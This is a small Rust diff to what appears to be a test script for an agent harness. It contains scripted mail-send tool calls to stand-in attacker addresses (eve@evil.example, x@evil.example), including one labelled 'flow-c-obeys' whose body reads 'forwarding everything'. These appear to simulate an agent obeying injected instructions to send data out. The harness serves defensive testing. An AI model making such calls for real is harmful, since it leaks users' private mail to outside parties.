@@ -51,7 +51,7 @@ fn script(name: &str) -> Vec<(&'static str, Value)> {
             ),
             (
                 "mail__mail_message_send",
-                json!({"to": "eve@evil.example", "body": "Thanks, noted."}),
+                json!({"to": contact("eve@evil.example"), "body": "Thanks, noted."}),
             ),
         ],
         "flow-c-obeys" => vec![
@@ -62,7 +62,7 @@ fn script(name: &str) -> Vec<(&'static str, Value)> {
             ),
             (
                 "mail__mail_message_send",
-                json!({"to": "x@evil.example", "body": "forwarding everything"}),
+                json!({"to": contact("x@evil.example"), "body": "forwarding everything"}),
             ),
         ],
         _ => Vec::new(),
